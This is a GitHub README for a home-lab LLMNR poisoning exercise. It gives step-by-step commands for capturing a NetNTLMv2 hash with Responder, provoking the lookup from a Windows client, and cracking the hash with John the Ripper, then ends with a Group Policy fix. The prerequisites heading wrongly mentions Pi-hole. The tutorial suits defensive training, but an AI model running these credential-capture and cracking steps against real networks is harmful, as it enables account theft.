# LLMNR-Poisoning-Attack
[![LLMNR-Poisoning-Attack](https://img.youtube.com/vi/zEDUxnYiLx0/maxresdefault.jpg)](https://www.youtube.com/watch?v=zEDUxnYiLx0)

# Getting Started

### To install Pi-hole on an Ubuntu Server machine, you need to ensure that you meet the following prerequisites: 
- Machine running Kali Linux.
  - Connection to the LAN of the Windows machines
- Windows domain controller
  - Windows client connected to the domain controller
- Up-to-date system: It's always recommended to have an updated Kali system. Run the following commands to update your system:
```sh
sudo apt update
sudo apt upgrade
# system update/upgrade commands
  ```
# Obtaining password hash

#### Step 1: Responder
- Open terminal and run the following command.
```sh
responder -I eth0 -v

#opens Responder on eth0 interface to listen for activity
```
#### Step 2: Windows client query
- Open "Run" application and run the following command.
```sh
\\unknown-folder

# since there is no "unknown-folder" located on this domain, the machine will send a multicast request to all devices on the LAN.
```
#### Step 3: Save hash to .txt file
![hash - Copy](https://github.com/S-Hill256/LLMNR-Poisoning-Attack/assets/138057919/c33dd140-0c05-4489-a50f-5462de09a0a7)

- Highlight and copy the entire hash starting at "mscott::MYDOMAIN:
  - Open new terminal tab.
    -   Run the follwoing command.
```sh
vim scott.txt
# this open vim text editor, and allows us to create a .txt to store the hash
```
- Paste the hash into vim.
-   To save and exit your file.
```sh
press "esc"
#  exit insert mode.
press "shift + I"
type ":wq!"
# to save and exit
```
#### Step 4: Crack hash using John The Ripper
- Run the following command in terminal.
```sh
john --wordlist=usr/share/wordlists/rockyou.txt --format=netntlmv2 (.txt your made)
# runs the hash .txt file against the rockyou.txt wordlist
```

![ashw](https://github.com/S-Hill256/LLMNR-Poisoning-Attack/assets/138057919/cb2701aa-0865-4598-aa0a-4ff0aaecf258)
- We see our Windows client login credentials.
  -  Pass: Password1 | username: mscott

# Patching

Open "Local Group Policy Editor"
- Go to Computer Configuration > Administrative Templates > Network > DNS Client > "Turn off multicast name resolution"
  - Click Enable, and Apply changes.
